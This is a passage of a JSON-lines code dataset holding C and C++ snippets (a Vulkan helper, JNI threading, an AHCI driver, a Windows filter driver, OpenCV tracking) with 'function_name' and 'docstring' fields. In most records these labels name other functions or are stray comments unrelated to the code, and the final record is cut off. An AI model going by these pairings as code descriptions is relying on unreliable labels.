{"content":"{'function_name': 'VkToPalSrcPipePoint', 'docstring': '\/\/ Check if top-of-pipe signaling is enough.', 'code': 'inline Pal::HwPipePoint VkToPalSrcPipePointForTimestampWrite(\\n    PipelineStageFlags flags)\\n{\\n    \/\/ Flags that require signaling at top-of-pipe.\\n    static const PipelineStageFlags srcTopOfPipeFlags =\\n        VK_PIPELINE_STAGE_TOP_OF_PIPE_BIT | VK_PIPELINE_STAGE_VERTEX_INPUT_BIT;\\n\\n    Pal::HwPipePoint srcPipePoint;\\n\\n    if ((flags & srcTopOfPipeFlags) != 0)\\n    {\\n        srcPipePoint = Pal::HwPipePostPrefetch;\\n    }\\n    else\\n    {\\n        srcPipePoint = Pal::HwPipeBottom;\\n    }\\n\\n    return srcPipePoint;\\n}'}","id":2148}
{"content":"{'function_name': 'getCustomerKey2', 'docstring': '\/\/ last name at offset 42 ? check', 'code': 'int64_t getOrderKey (char *row_order) {   \/\/ o_id,o_d_id,o_w_id\\n    return getOrderLineKey (row_order);\\n}'}","id":2151}
{"content":"{'function_name': 'Java_com_apress_threads_MainActivity_nativeWorker', 'docstring': '\/\/ Unlock mutex\\r', 'code': 'void Java_com_apress_threads_MainActivity_posixThreads (\\r\\n\\t\\tJNIEnv* env,\\r\\n\\t\\tjobject obj,\\r\\n\\t\\tjint threads,\\r\\n\\t\\tjint iterations)\\r\\n{\\r\\n\\tpthread_t *handles = new pthread_t[threads];\\r\\n\\t\/\/ Create a POSIX thread for each worker\\r\\n\\tjint i = 0;\\r\\n\\tfor (i = 0; i < threads; i++)\\r\\n\\t{\\r\\n\\t\\t\/\/ Thread handle\\r\\n\/\/\\t\\tpthread_t thread;\\r\\n\\r\\n\\t\\t\/\/ Native worker thread arguments\\r\\n\\t\\tNativeWorkerArgs* nativeWorkerArgs = new NativeWorkerArgs();\\r\\n\\t\\tnativeWorkerArgs->id = i;\\r\\n\\t\\tnativeWorkerArgs->iterations = iterations;\\r\\n\\r\\n\\t\\t\/\/ Create a new thread\\r\\n\\t\\tint result = pthread_create(\\r\\n\\t\\t\\t\\t&handles[i],\\r\\n\\t\\t\\t\\tNULL,\\r\\n\\t\\t\\t\\tnativeWorkerThread,\\r\\n\\t\\t\\t\\t(void*) nativeWorkerArgs);\\r\\n\\r\\n\\t\\tif (0 != result)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ Get the exception class\\r\\n\\t\\t\\tjclass exceptionClazz = env->FindClass(\\r\\n\\t\\t\\t\\t\\t\"java\/lang\/RuntimeException\");\\r\\n\\r\\n\\t\\t\\t\/\/ Throw exception\\r\\n\\t\\t\\tenv->ThrowNew(exceptionClazz, \"Unable to create thread\");\\r\\n\\t\\t\\tgoto exit;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\n\\tfor( i = 0; i < threads; ++i )\\r\\n\\t{\\r\\n\\t\\tvoid *result = NULL;\\r\\n\\r\\n\\t\\tif( 0 != pthread_join(handles[i], &result))\\r\\n\\t\\t{\\r\\n\\t\\t\\tjclass exceptionClazz = env->FindClass(\"java\/lang\/RuntimeException\");\\r\\n\\t\\t\\tenv->ThrowNew(exceptionClazz, \"Unable to join thread\");\\r\\n\\t\\t}\\r\\n\\t\\telse\\r\\n\\t\\t{\\r\\n\\t\\t\\tchar message[26];\\r\\n\\t\\t\\tsprintf(message, \"Worker %d returned %d\", i, result);\\r\\n\\t\\t\\tjstring messageString = env->NewStringUTF(message);\\r\\n\\r\\n\\t\\t\\tenv->CallVoidMethod(obj, gOnNativeMessage, messageString );\\r\\n\\t\\t\\tif( NULL != env->ExceptionOccurred())\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tgoto exit;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\r\\nexit:\\r\\n\\treturn;\\r\\n}'}","id":2153}
{"content":"{'function_name': '_removeWeight', 'docstring': '\/\/ read ONNX Model', 'code': 'int main(int argc, const char* argv[]) {\\n    if (argc < 4) {\\n        if (argc < 3) {\\n            MNN_PRINT(\"Usage: .\/OnnxClip SRC.onnx DST.onnx layerName\\\\n\");\\n            MNN_PRINT(\"Or: .\/OnnxClip SRC.onnx struct.json\\\\n\");\\n            return 0;\\n        }\\n        _removeWeight(argc, argv);\\n        return 0;\\n    }\\n    auto modelName = argv[1];\\n    auto dstModelName = argv[2];\\n    auto layerName = argv[3];\\n    FUNC_PRINT_ALL(modelName, s);\\n    FUNC_PRINT_ALL(dstModelName, s);\\n    FUNC_PRINT_ALL(layerName, s);\\n    \\n    onnx::ModelProto onnxModel;\\n    \/\/ read ONNX Model\\n    bool success = onnx_read_proto_from_binary(modelName, &onnxModel);\\n    if (!success) {\\n        MNN_PRINT(\"Load onnx model failed\\\\n\");\\n        return 0;\\n    }\\n    auto onnxGraph = onnxModel.mutable_graph();\\n    auto output = onnxGraph->mutable_output(0);\\n    output->set_name(layerName);\\n    output->clear_type();\\n    const int nodeCount   = onnxGraph->node_size();\\n    int index = -1;\\n    for (int i=0; i<nodeCount; ++i) {\\n        auto node = onnxGraph->node(i);\\n        if (node.name() == layerName) {\\n            index = i;\\n            break;\\n        }\\n    }\\n    if (index < 0) {\\n        MNN_ERROR(\"Can\\'t find %s in model, use outputName\\\\n\", layerName);\\n        for (int i=0; i<nodeCount; ++i) {\\n            auto node = onnxGraph->node(i);\\n            for (int v=0; v<node.output_size(); ++v) {\\n                if (node.output(v) == layerName) {\\n                    index = i;\\n                    break;\\n                }\\n            }\\n            if (index >= 0) {\\n                break;\\n            }\\n        }\\n        if (index < 0) {\\n            MNN_ERROR(\"Can\\'t find outputName %s in model, Failed\\\\n\", layerName);\\n            return 0;\\n        }\\n    }\\n    int clipSize = nodeCount - index - 1;\\n    for (int i =0; i<clipSize; ++i) {\\n        onnxGraph->mutable_node()->RemoveLast();\\n    }\\n    onnxGraph->mutable_output()->Clear();\\n    auto info = onnxGraph->mutable_output()->Add();\\n    info->set_name(layerName);\\n    onnx_write_proto_from_binary(dstModelName, &onnxModel);\\n    return 0;\\n}'}","id":2156}
{"content":"{'function_name': 'apply_MB', 'docstring': '\/\/ (U-NE, L-NW, D-SW, R-SE)', 'code': 'int main() {\\n\\n\\tcenter_corners_555 new_cube;\\n\\n\\tnew_cube.disp();\\n\\tstd::cout << \"\\\\t---\\\\n\";\\n\\n\\t\/\/ MR2 R2 B2 U2 ML U2 MR\\' U2 MR U2 F2 MR F2 ML\\' B2 R2 MR2\\n\\tapply_MR(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_R(new_cube);\\n\\tapply_R(new_cube);\\n\\tapply_B(new_cube);\\n\\tapply_B(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_ML(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_U(new_cube);\\n\\tapply_F(new_cube);\\n\\tapply_F(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_F(new_cube);\\n\\tapply_F(new_cube);\\n\\tapply_ML(new_cube);\\n\\tapply_ML(new_cube);\\n\\tapply_ML(new_cube);\\n\\tapply_B(new_cube);\\n\\tapply_B(new_cube);\\n\\tapply_R(new_cube);\\n\\tapply_R(new_cube);\\n\\tapply_MR(new_cube);\\n\\tapply_MR(new_cube);\\n\\tnew_cube.disp();\\n\\tstd::cout << \"\\\\t---\\\\n\";\\n\\tstd::cout << \"Sgn: \" << signum(new_cube) << \\'\\\\n\\';\\n\\tstd::cout << \"\\\\t---\\\\n\";\\n\\n\\treturn 0;\\n}'}","id":2160}
{"content":"{'function_name': 'ahci_ctlr_reset', 'docstring': '\/\/ \\t}', 'code': 'int ahci_attach(device_t dev) {\\n  struct ahci_controller *ctlr =\\n      reinterpret_cast<struct ahci_controller *>(device_get_softc(dev));\\n  int error, i, u, speed, unit;\\n  u_int32_t version;\\n  device_t child;\\n\\n  ctlr->dev = dev;\\n  ctlr->ccc = 0;\\n  resource_int_value(device_get_name(dev), device_get_unit(dev), \"ccc\",\\n                     &ctlr->ccc);\\n\\n  \/* Setup our own memory management for channels. *\/\\n  ctlr->sc_iomem.rm_start = rman_get_start(ctlr->r_mem);\\n  ctlr->sc_iomem.rm_end = rman_get_end(ctlr->r_mem);\\n  ctlr->sc_iomem.rm_type = RMAN_ARRAY;\\n  ctlr->sc_iomem.rm_descr = \"I\/O memory addresses\";\\n  if ((error = rman_init(&ctlr->sc_iomem)) != 0) {\\n    ahci_free_mem(dev);\\n    return (error);\\n  }\\n  if ((error = rman_manage_region(&ctlr->sc_iomem, rman_get_start(ctlr->r_mem),\\n                                  rman_get_end(ctlr->r_mem))) != 0) {\\n    ahci_free_mem(dev);\\n    rman_fini(&ctlr->sc_iomem);\\n    return (error);\\n  }\\n  \/* Get the HW capabilities *\/\\n  version = ATA_INL(ctlr->r_mem, AHCI_VS);\\n  ctlr->caps = ATA_INL(ctlr->r_mem, AHCI_CAP);\\n  if (version >= 0x00010200) ctlr->caps2 = ATA_INL(ctlr->r_mem, AHCI_CAP2);\\n  if (ctlr->caps & AHCI_CAP_EMS)\\n    ctlr->capsem = ATA_INL(ctlr->r_mem, AHCI_EM_CTL);\\n\\n  if (ctlr->quirks & AHCI_Q_FORCE_PI) {\\n    \/*\\n     * Enable ports.\\n     * The spec says that BIOS sets up bits corresponding to\\n     * available ports. On platforms where this information\\n     * is missing, the driver can define available ports on its own.\\n     *\/\\n    int nports = (ctlr->caps & AHCI_CAP_NPMASK) + 1;\\n    int nmask = (1 << nports) - 1;\\n\\n    ATA_OUTL(ctlr->r_mem, AHCI_PI, nmask);\\n    device_printf(dev, \"Forcing PI to %d ports (mask = %x)\\\\n\", nports, nmask);\\n  }\\n\\n  ctlr->ichannels = ATA_INL(ctlr->r_mem, AHCI_PI);\\n\\n  \/* Identify and set separate quirks for HBA and RAID f\/w Marvells. *\/\\n  if ((ctlr->quirks & AHCI_Q_ALTSIG) && (ctlr->caps & AHCI_CAP_SPM) == 0)\\n    ctlr->quirks |= AHCI_Q_NOBSYRES;\\n\\n  if (ctlr->quirks & AHCI_Q_1CH) {\\n    ctlr->caps &= ~AHCI_CAP_NPMASK;\\n    ctlr->ichannels &= 0x01;\\n  }\\n  if (ctlr->quirks & AHCI_Q_2CH) {\\n    ctlr->caps &= ~AHCI_CAP_NPMASK;\\n    ctlr->caps |= 1;\\n    ctlr->ichannels &= 0x03;\\n  }\\n  if (ctlr->quirks & AHCI_Q_4CH) {\\n    ctlr->caps &= ~AHCI_CAP_NPMASK;\\n    ctlr->caps |= 3;\\n    ctlr->ichannels &= 0x0f;\\n  }\\n  ctlr->channels =\\n      MAX((unsigned)flsl(ctlr->ichannels), (ctlr->caps & AHCI_CAP_NPMASK) + 1);\\n  if (ctlr->quirks & AHCI_Q_NOPMP) ctlr->caps &= ~AHCI_CAP_SPM;\\n  if (ctlr->quirks & AHCI_Q_NONCQ) ctlr->caps &= ~AHCI_CAP_SNCQ;\\n  if ((ctlr->caps & AHCI_CAP_CCCS) == 0) ctlr->ccc = 0;\\n  ctlr->emloc = ATA_INL(ctlr->r_mem, AHCI_EM_LOC);\\n\\n  \/* Create controller-wide DMA tag. *\/\\n  if (bus_dma_tag_create(bus_get_dma_tag(dev), 1, 0,\\n                         (ctlr->caps & AHCI_CAP_64BIT)\\n                             ? BUS_SPACE_MAXADDR\\n                             : BUS_SPACE_MAXADDR_32BIT,\\n                         BUS_SPACE_MAXADDR, NULL, NULL, BUS_SPACE_MAXSIZE,\\n                         BUS_SPACE_UNRESTRICTED, BUS_SPACE_MAXSIZE, 0, NULL,\\n                         NULL, &ctlr->dma_tag)) {\\n    ahci_free_mem(dev);\\n    rman_fini(&ctlr->sc_iomem);\\n    return (ENXIO);\\n  }\\n\\n  ahci_ctlr_setup(dev);\\n\\n  \/* Setup interrupts. *\/\\n  if ((error = ahci_setup_interrupt(dev)) != 0) {\\n    bus_dma_tag_destroy(ctlr->dma_tag);\\n    ahci_free_mem(dev);\\n    rman_fini(&ctlr->sc_iomem);\\n    return (error);\\n  }\\n\\n  i = 0;\\n  for (u = ctlr->ichannels; u != 0; u >>= 1) i += (u & 1);\\n  ctlr->direct = (ctlr->msi && (ctlr->numirqs > 1 || i <= 3));\\n  resource_int_value(device_get_name(dev), device_get_unit(dev), \"direct\",\\n                     &ctlr->direct);\\n  \/* Announce HW capabilities. *\/\\n  speed = (ctlr->caps & AHCI_CAP_ISS) >> AHCI_CAP_ISS_SHIFT;\\n  device_printf(\\n      dev, \"AHCI v%x.%02x with %d %sGbps ports, Port Multiplier %s%s\\\\n\",\\n      ((version >> 20) & 0xf0) + ((version >> 16) & 0x0f),\\n      ((version >> 4) & 0xf0) + (version & 0x0f),\\n      (ctlr->caps & AHCI_CAP_NPMASK) + 1,\\n      ((speed == 1) ? \"1.5\"\\n                    : ((speed == 2) ? \"3\" : ((speed == 3) ? \"6\" : \"?\"))),\\n      (ctlr->caps & AHCI_CAP_SPM) ? \"supported\" : \"not supported\",\\n      (ctlr->caps & AHCI_CAP_FBSS) ? \" with FBS\" : \"\");\\n  if (ctlr->quirks != 0) {\\n    \/\/ Since %b conversion of printf is not implemented, replace it with %X.\\n    \/\/ device_printf(dev, \"quirks=0x%b\\\\n\", ctlr->quirks, AHCI_Q_BIT_STRING);\\n    device_printf(dev, \"quirks=0x%X\\\\n\", ctlr->quirks);\\n  }\\n  if (bootverbose) {\\n    device_printf(\\n        dev, \"Caps:%s%s%s%s%s%s%s%s %sGbps\",\\n        (ctlr->caps & AHCI_CAP_64BIT) ? \" 64bit\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SNCQ) ? \" NCQ\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SSNTF) ? \" SNTF\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SMPS) ? \" MPS\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SSS) ? \" SS\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SALP) ? \" ALP\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SAL) ? \" AL\" : \"\",\\n        (ctlr->caps & AHCI_CAP_SCLO) ? \" CLO\" : \"\",\\n        ((speed == 1) ? \"1.5\"\\n                      : ((speed == 2) ? \"3\" : ((speed == 3) ? \"6\" : \"?\"))));\\n    \/\/ printf(\"%s%s%s%s%s%s %dcmd%s%s%s %dports\\\\n\",\\n    \/\/     (ctlr->caps & AHCI_CAP_SAM) ? \" AM\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_SPM) ? \" PM\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_FBSS) ? \" FBS\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_PMD) ? \" PMD\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_SSC) ? \" SSC\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_PSC) ? \" PSC\":\"\",\\n    \/\/     ((ctlr->caps & AHCI_CAP_NCS) >> AHCI_CAP_NCS_SHIFT) + 1,\\n    \/\/     (ctlr->caps & AHCI_CAP_CCCS) ? \" CCC\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_EMS) ? \" EM\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_SXS) ? \" eSATA\":\"\",\\n    \/\/     (ctlr->caps & AHCI_CAP_NPMASK) + 1);\\n  }\\n  if (bootverbose && version >= 0x00010200) {\\n    device_printf(dev, \"Caps2:%s%s%s%s%s%s\\\\n\",\\n                  (ctlr->caps2 & AHCI_CAP2_DESO) ? \" DESO\" : \"\",\\n                  (ctlr->caps2 & AHCI_CAP2_SADM) ? \" SADM\" : \"\",\\n                  (ctlr->caps2 & AHCI_CAP2_SDS) ? \" SDS\" : \"\",\\n                  (ctlr->caps2 & AHCI_CAP2_APST) ? \" APST\" : \"\",\\n                  (ctlr->caps2 & AHCI_CAP2_NVMP) ? \" NVMP\" : \"\",\\n                  (ctlr->caps2 & AHCI_CAP2_BOH) ? \" BOH\" : \"\");\\n  }\\n  \/* Attach all channels on this controller *\/\\n  for (unit = 0; unit < ctlr->channels; unit++) {\\n    \/\/ child = device_add_child(dev, \"ahcich\", -1);\\n    child = AhciChannel::Init(dev->GetMasterClass<AhciCtrl>());\\n    if (child == NULL) {\\n      device_printf(dev, \"failed to add channel device\\\\n\");\\n      continue;\\n    }\\n    device_set_ivars(child, (void *)(intptr_t)unit);\\n    if ((ctlr->ichannels & (1 << unit)) == 0) {\\n      kassert(false);\\n      \/\/ device_disable(child);\\n    }\\n  }\\n  if (ctlr->caps & AHCI_CAP_EMS) {\\n    kassert(false);\\n    \/\/ \\t\\tchild = device_add_child(dev, \"ahciem\", -1);\\n    \/\/ \\t\\tif (child == NULL)\\n    \/\/ \\t\\t\\tdevice_printf(dev, \"failed to add enclosure device\\\\n\");\\n    \/\/ \\t\\telse\\n    \/\/ \\t\\t\\tdevice_set_ivars(child, (void *)(intptr_t)-1);\\n  }\\n  bus_generic_attach(dev);\\n  return (0);\\n}'}","id":2165}
{"content":"{'function_name': 'UnregisterLeasingApplicationWaitForZeroRefCount', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nLeasingApplicationChangeRefCount(\\n    POVERLAPPED_LEASE_LAYER_EXTENSION Overlapped,\\n    HANDLE LeasingApplicationHandle,\\n    BOOL IsIncrement\\n    )\\n\\n\/*++\\n \\nRoutine Description:\\n \\n    Internal routine. Increment or decrements a leasing application ref count.\\n\\nParameters Description:\\n \\n    LeasingApplicationHandle - leasing applicaiton handle to work on.\\n\\n    IsIncrement - TRUE for increment, FALSE for decrement.\\n \\nReturn Value:\\n \\n    TRUE if the leasing application changed ref count appropriately.\\n \\n--*\/\\n\\n{\\n    BOOL RefCountIncreased = TRUE;\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == Overlapped) {\\n        LeaseLayerEvents.ChangeRefCountNullOverlapped(LONGLONG(0), IsIncrement);\\n        return FALSE;\\n    }\\n\\n    if (NULL == LeasingApplicationHandle || \\n        INVALID_HANDLE_VALUE == LeasingApplicationHandle) {\\n\\n        LeaseLayerEvents.ChangeRefCountInvalidHandle(LONGLONG(LeasingApplicationHandle), IsIncrement);\\n\\n        return FALSE;\\n    }\\n\\n    {\\n        AcquireExclusiveLock lock(*LeaseLayerLock);\\n\\n        LEASING_APPLICATION_REF_COUNT_HASH_TABLE_ITERATOR IsFound;\\n\\n        \/\/\\n        \/\/ Make sure the entry is there.\\n        \/\/\\n        IsFound = LeasingApplicationRefCountHashTable->find(LeasingApplicationHandle);\\n\\n        if (IsFound == LeasingApplicationRefCountHashTable->end()) {\\n\\n            LeaseLayerEvents.ChangeRefCountNotFound(LONGLONG(LeasingApplicationHandle), IsIncrement);\\n            RefCountIncreased = FALSE;\\n\\n        }\\n\/\/TODO shuxu check this to see if it is needed\\n\/\/else if (IsFound->second.Overlapped != Overlapped) {\\n\/\/\\n\/\/            LeaseLayerEvents.ChangeRefCountOverlappedMismatch(LONGLONG(LeasingApplicationHandle), IsIncrement);\\n\/\/            RefCountIncreased = FALSE;\\n\/\/\\n\/\/        }\\n        else {\\n\\n            \/\/\\n            \/\/ Change ref count.\\n            \/\/\\n            if (IsIncrement) {\\n\\n                RefCountIncreased = AddRef(&IsFound->second);\\n\\n            } else {\\n\\n                ReleaseRef(&IsFound->second); \\n            }\\n\\n        }\\n    }\\n\\n    return RefCountIncreased;\\n}'}","id":2171}
{"content":"{'function_name': 'interface', 'docstring': '\/\/ Classification problem', 'code': 'void bounds(double** X, int n_samples, int* MFs, int n_inputs, int n_outputs,\\n            double mu_delta, double s_par[2], double c_par[2], double A_par[2],\\n            double*& LB, double*& UB) \\n{\\n    \/\/ Anfis parameters\\n    int n_pf = sum(MFs, n_inputs);\\n    int n_cf = prod(MFs, n_inputs);\\n    int n_var = 3 * n_pf + (n_inputs + 1) * n_cf * n_outputs;\\n    LB = new_Array<double>(n_var);\\n    UB = new_Array<double>(n_var);\\n\\n    \/\/ Premise parameters (mu, s, c)\\n    int idx = 0;\\n    for (int j=0; j<n_inputs; j++) {\\n\\n        \/\/ Feature (input) min, max, and range\\n        double X_min = value_min(X[j], n_samples);\\n        double X_max = value_max(X[j], n_samples);\\n        double X_delta = X_max - X_min;\\n\\n        \/\/ Init parameters for mean and standard deviation \\n        double X_step, X_start, s;\\n        if (MFs[j] == 1) {\\n            X_step = 0.0;\\n            X_start = (X_min + X_max) \/ 2.0;\\n            s = s_par[0];\\n        }\\n        else {\\n            X_step = X_delta \/ static_cast<double>(MFs[j] - 1);\\n            X_start = X_min;\\n            s = s_par[0] * X_step;\\n        }\\n\\n        \/\/ Assign values to the lower (LB) and higher (UB) boundary arrays\\n        for (int k=0; k<MFs[j]; k++) {\\n            double mu = X_start + X_step * static_cast<double>(k);\\n            LB[idx] = mu - mu_delta * X_delta;          \/\/ mu lower limit\\n            UB[idx] = mu + mu_delta * X_delta;          \/\/ mu upper limit\\n            LB[n_pf+idx] = s - s_par[1];                \/\/ s lower limit\\n            UB[n_pf+idx] = s + s_par[1];                \/\/ s upper limit\\n            LB[2*n_pf+idx] = c_par[0];                  \/\/ c lower limit\\n            UB[2*n_pf+idx] = c_par[1];                  \/\/ c upper limit\\n            idx++;\\n        }\\n        for (int k=3*n_pf; k<n_var; k++) {\\n            LB[k] = A_par[0];                           \/\/ A lower limit\\n            UB[k] = A_par[1];                           \/\/ A upper limit\\n        }        \\n    }\\n\\n    return;\\n}'}","id":2177}
{"content":"{'function_name': 'calcEigenVectors', 'docstring': '\/\/\\t\\tcout << \"eigenvector\" << endl<<_eval.transpose() << endl << _evec << endl;', 'code': 'int calcPseudoInverse(const cnoid::MatrixXd &_a, cnoid::MatrixXd &_a_pseu, double _sv_ratio)\\n    {\\n        Eigen::JacobiSVD<cnoid::MatrixXd> svd(_a, Eigen::ComputeThinU | Eigen::ComputeThinV);\\n\\n        cnoid::VectorXd s = svd.singularValues();\\n        int i, j, k;\\n\\n        double smin, smax=0.0;\\n        for (j = 0; j < s.size() ; j++) if (s[j] > smax) smax = s[j];\\n        smin = smax*_sv_ratio; \\t\\t\\t\/\/ default _sv_ratio is 1.0e-3\\n\\n        for (j = 0; j < s.size() ; j++){\\n            if (s[j] <= smin) s[j] = 0.0;\\n            else s[j] = 1.0\/s[j];\\n        }\\n        \/\/ V * (S^(-1)*U^(T))\\n        _a_pseu = svd.matrixV() * s.asDiagonal() * svd.matrixU().transpose();\\n\\n       return 0;\\n    }'}","id":2187}
{"content":"{'function_name': 'BottomPlayerRectEstimation', 'docstring': '\/\/ Draw the largest contour using previously stored index', 'code': 'std::vector<cv::Rect> PlayerRectExtraction(std::string filename) {\\n\\t\\tcv::VideoCapture stream(filename);\\n\\t\\tif (!stream.isOpened()) {\\n\\t\\t\\t\/\/ error in opening the video input\\n\\t\\t\\tstd::cerr << \"Unable to open video file: \" << filename << std::endl;\\n\\t\\t\\texit(EXIT_FAILURE);\\n\\t\\t}\\n\\n\\t\\tcv::Mat image, pimage, rimage, tpimage, bpimage, stpimage, sbpimage, tpimage2, bpimage2;\\n\\t\\tcv::Mat tpfgmaskGMM, bpfgmaskGMM;\\n\\t\\tcv::Rect tplayer_rect, bplayer_rect;\\n\\t\\tcv::Ptr<cv::BackgroundSubtractor> GMM; \/\/ Gaussian Mixture Model\\n\\n\\t\\tstd::vector<cv::Rect> playersposition;\\n\\n\\t\\tGMM = cv::createBackgroundSubtractorMOG2(500, 16, false);\\n\\n\\t\\tint count = 0;\\n\\t\\twhile (true) {\\n\\t\\t\\tstream >> image;\\n\\t\\t\\tif (image.empty()) {\\n\\t\\t\\t\\t\/\/std::cout << \"End...\";\\n\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\n\\t\\t\\tcvtColor(image, tpimage, CV_BGR2GRAY);\\n\\t\\t\\tcvtColor(image, bpimage, CV_BGR2GRAY);\\n\\n\\t\\t\\ttplayer_rect = TopPlayerRectEstimation(image, GMM);\\n\\t\\t\\tbplayer_rect = BottomPlayerRectEstimation(image, GMM);\\n\\n\\t\\t\\tplayersposition.push_back(tplayer_rect);\\n\\t\\t\\tplayersposition.push_back(bplayer_rect);\\n\\t\\t\\tcount++;\\n\\t\\t}\\n\\n\\t\\treturn playersposition;\\n\\t}'}","id":2189}
{"content":"{'function_name': 'map_basic', 'docstring': '\/\/ updation', 'code': 'int main() {\\n\\n\\t\\t\/\/linked_list();\\n\/\/\\t\\tforward_list_demo();\\n\\t\\t\/\/set_demo();\\n\\t\\t\/\/deque_demo();\\n\\t\\t\/\/find_elements_unordered_map();\\n\\n\\t\\t\/\/hash_demo();\\n\/\/\\t\\tbit_set();\\n\\t\\t\/\/tuple_demo();\\n\\t\\t\/\/map_basic();\\n\\n\\t\\tgetchar();\\n\\t\\treturn 0;\\n\\t}'}","id":2194}
{"content":"{'function_name': 'CompleteRequest', 'docstring': '\/\/ CompleteRequest\\r', 'code': 'NTSTATUS DispatchAny(IN PDEVICE_OBJECT fido, IN PIRP Irp)\\r\\n\\t{\\t\\t\\t\\t\\t\\t\\t\/\/ DispatchAny\\r\\n\\tPDEVICE_EXTENSION pdx = (PDEVICE_EXTENSION) fido->DeviceExtension;\\r\\n\\tPIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);\\r\\n\\r\\n#if DBG\\r\\n\\tstatic char* irpname[] = {\\r\\n\\t\\t\"IRP_MJ_CREATE\",\\r\\n\\t\\t\"IRP_MJ_CREATE_NAMED_PIPE\",\\r\\n\\t\\t\"IRP_MJ_CLOSE\",\\r\\n\\t\\t\"IRP_MJ_READ\",\\r\\n\\t\\t\"IRP_MJ_WRITE\",\\r\\n\\t\\t\"IRP_MJ_QUERY_INFORMATION\",\\r\\n\\t\\t\"IRP_MJ_SET_INFORMATION\",\\r\\n\\t\\t\"IRP_MJ_QUERY_EA\",\\r\\n\\t\\t\"IRP_MJ_SET_EA\",\\r\\n\\t\\t\"IRP_MJ_FLUSH_BUFFERS\",\\r\\n\\t\\t\"IRP_MJ_QUERY_VOLUME_INFORMATION\",\\r\\n\\t\\t\"IRP_MJ_SET_VOLUME_INFORMATION\",\\r\\n\\t\\t\"IRP_MJ_DIRECTORY_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_FILE_SYSTEM_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_DEVICE_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_INTERNAL_DEVICE_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_SHUTDOWN\",\\r\\n\\t\\t\"IRP_MJ_LOCK_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_CLEANUP\",\\r\\n\\t\\t\"IRP_MJ_CREATE_MAILSLOT\",\\r\\n\\t\\t\"IRP_MJ_QUERY_SECURITY\",\\r\\n\\t\\t\"IRP_MJ_SET_SECURITY\",\\r\\n\\t\\t\"IRP_MJ_POWER\",\\r\\n\\t\\t\"IRP_MJ_SYSTEM_CONTROL\",\\r\\n\\t\\t\"IRP_MJ_DEVICE_CHANGE\",\\r\\n\\t\\t\"IRP_MJ_QUERY_QUOTA\",\\r\\n\\t\\t\"IRP_MJ_SET_QUOTA\",\\r\\n\\t\\t\"IRP_MJ_PNP\",\\r\\n\\t\\t};\\r\\n\\r\\n\\tUCHAR type = stack->MajorFunction;\\r\\n\\tif (type >= arraysize(irpname))\\r\\n\\t\\tKdPrint((DRIVERNAME \" - Unknown IRP, major type %X\\\\n\", type));\\r\\n\\telse\\r\\n\\t\\tKdPrint((DRIVERNAME \" - %s\\\\n\", irpname[type]));\\r\\n#endif\\r\\n\\r\\n\\t\/\/ Pass request down without additional processing\\r\\n\\r\\n\\tNTSTATUS status;\\r\\n\\tstatus = IoAcquireRemoveLock(&pdx->RemoveLock, Irp);\\r\\n\\tif (!NT_SUCCESS(status))\\r\\n\\t\\treturn CompleteRequest(Irp, status, 0);\\r\\n\\tIoSkipCurrentIrpStackLocation(Irp);\\r\\n\\tstatus = IoCallDriver(pdx->LowerDeviceObject, Irp);\\r\\n\\tIoReleaseRemoveLock(&pdx->RemoveLock, Irp);\\r\\n\\treturn status;\\r\\n\\t}'}","id":2200}
{"content":"{'function_name': 'demosaic_byb_rd3_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_byb_rd4_select(demosaic_bx_cache& demosaic_bx, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_byb_rd4 read pattern: { demosaic_byb_update_0[d0, d1] -> demosaic_bx[1 + 2d0, 1 + d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_byb_update_0[d0, d1] -> [5 + d1, 3 + d0, 8] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_bx_update_0[d0, d1] -> [3 + d1, 3 + d0, 7] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: { demosaic_byb_update_0[d0, d1] -> 960 : 0 < d0 <= 958 and 0 <= d1 <= 1079; demosaic_byb_update_0[d0, d1] -> (1 + d0) : d0 = 959 and 0 <= d1 <= 1079; demosaic_byb_update_0[d0, d1] -> 960 : d0 = 0 and 0 <= d1 <= 1079 }\\n  auto value_demosaic_bx_demosaic_bx_update_0_write1 = demosaic_bx.demosaic_bx_demosaic_bx_update_0_write1_merged_banks_3.peek_960();\\n  return 